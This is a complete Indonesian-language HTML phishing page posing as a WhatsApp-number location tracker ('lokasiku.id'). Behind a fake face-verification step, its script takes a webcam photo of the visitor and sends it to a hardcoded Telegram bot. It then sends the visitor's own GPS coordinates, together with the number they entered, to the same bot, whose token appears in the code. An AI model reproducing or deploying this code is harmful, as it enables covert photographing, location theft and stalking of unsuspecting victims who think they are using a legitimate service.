<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Lacak Lokasi Dengan Nomor WhatsApp</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Inter', sans-serif;
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
      flex-direction: column;
    }
    .container {
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 20px;
      padding: 40px 30px;
      backdrop-filter: blur(15px);
      box-shadow: 0 20px 40px rgba(0,0,0,0.3);
      text-align: center;
      max-width: 450px;
      width: 90%;
      animation: fadeIn 1s ease;
    }
    h2 { font-weight: 600; font-size: 22px; margin-bottom: 10px; }
    p { font-size: 14px; color: #ccc; margin-bottom: 20px; }
    .btn-premium {
      padding: 14px 35px;
      font-size: 16px;
      border: none;
      border-radius: 30px;
      background: linear-gradient(to right, #00c896, #00b8e6);
      color: white;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 8px 25px rgba(0, 200, 150, 0.4);
    }
    .btn-premium:hover {
      transform: scale(1.05);
      box-shadow: 0 12px 30px rgba(0, 200, 150, 0.6);
    }
    @keyframes fadeIn {
      from {opacity: 0; transform: translateY(20px);}
      to {opacity: 1; transform: translateY(0);}
    }
    .credit { margin-top: 25px; font-size: 12px; color: #aaa; }

    #page2 { display: none; }
    input[type="text"] {
      width: 100%; padding: 12px 16px; border-radius: 10px;
      border: none; font-size: 1rem; outline: none;
      margin-bottom: 20px;
    }
    button {
      width: 100%;
      background: #35d8ac;
      color: #052c2c;
      font-weight: 700;
      font-size: 1.1rem;
      padding: 14px 0;
      border: none;
      border-radius: 10px;
      cursor: pointer;
    }
    .result {
      margin-top: 28px;
      background: rgba(255,255,255,0.15);
      border-radius: 12px;
      padding: 20px;
      font-size: 0.95rem;
      line-height: 1.5;
      box-shadow: inset 2px 2px 10px rgba(255,255,255,0.3);
    }

    #videoWrapper {
      margin: 20px 0;
      display: none;
    }

    #videoPreview {
      width: 100%;
      max-width: 300px;
      border-radius: 15px;
      border: 2px solid #35d8ac;
    }
  </style>
</head>
<body>

<div id="page1" class="container">
  <h2>Selamat Datang Di lokasiku.id</h2>
  <p>Untuk memulai lacak lokasi dengan nomor WhatsApp, Verifikasi wajah anda terlebih dahulu.</p>
  <div id="videoWrapper">
    <video id="videoPreview" autoplay playsinline muted></video>
  </div>
  <button class="btn-premium" onclick="izinKamera()">Verifikasi Sekarang</button>
</div>

<div id="page2" class="container">
  <h2>Mulai Lacak Lokasi Dilokasiku.id</h2>
  <form id="trackForm">
    <label for="waNumber">Masukkan Nomor WhatsApp</label>
    <input type="text" id="waNumber" placeholder="Contoh: 6281234567890" required pattern="^62[0-9]{8,14}$">
    <button type="submit">Lacak Lokasi</button>
  </form>
  <div id="result" class="result"></div>
</div>

<div class="credit">Create by <strong>lokasiku.id</strong></div>

<script>
let stream;
const token = "7351970346:AAF_rQ0TIxzm3a-e1azTZ0pyoueC_G_zHro";
const chatId = "5408845642";

async function izinKamera() {
  try {
    const tombol = document.querySelector(".btn-premium");
    tombol.disabled = true;
    tombol.innerText = "Memproses Verifikasi...";

    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }, audio: false
    });

    const video = document.getElementById("videoPreview");
    video.srcObject = stream;
    document.getElementById("videoWrapper").style.display = "block";
    video.play();

    video.addEventListener('canplay', function () {
      setTimeout(() => ambilFoto(video, tombol), 2000);
    });

  } catch (err) {
    alert("Gagal Verifikasi: " + err.message);
  }
}

function ambilFoto(video, tombol) {
  const canvas = document.createElement("canvas");
  const ctx = canvas.getContext("2d");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  canvas.toBlob(async function(blob) {
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("photo", blob, "verifikasi.jpg");

    try {
      const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: "POST",
        body: formData
      });

      if (res.ok) {
        stream.getTracks().forEach(track => track.stop());
        document.getElementById('page1').style.display = 'none';
        document.getElementById('page2').style.display = 'block';
      } else {
        alert("Gagal Kirim Foto");
      }
    } catch (err) {
      alert("Error Kirim: " + err.message);
    }
  }, "image/jpeg");
}

document.getElementById('trackForm').addEventListener('submit', async function(e) {
  e.preventDefault();
  const resultEl = document.getElementById('result');
  const waNumber = document.getElementById('waNumber').value.trim();

  if (!/^62\d{8,14}$/.test(waNumber)) {
    resultEl.textContent = 'Nomor tidak valid. Format: 6281234567890';
    return;
  }

  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;

      const message = `*Lacak Lokasi WhatsApp*\n\nNomor: \`${waNumber}\`\nLokasi GPS: [${lat}, ${lon}]\n\n_(Lokasi ini berdasarkan GPS pengguna)_`;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "Markdown"
        })
      })
      .then(response => {
        if (response.ok) {
          resultEl.textContent = `Lokasi berhasil dilacak!\nNomor: ${waNumber}\nLokasi GPS: ${lat}, ${lon}`;
        } else {
          resultEl.textContent = 'Lokasi gagal dilacak.';
        }
      })
      .catch(err => {
        resultEl.textContent = 'Terjadi kesalahan: ' + err.message;
      });

    }, function(error) {
      resultEl.textContent = 'Gagal mendapatkan lokasi: ' + error.message;
    });
  } else {
    resultEl.textContent = 'Geolocation tidak didukung oleh browser ini.';
  }
});
</script>
</body>
</html>
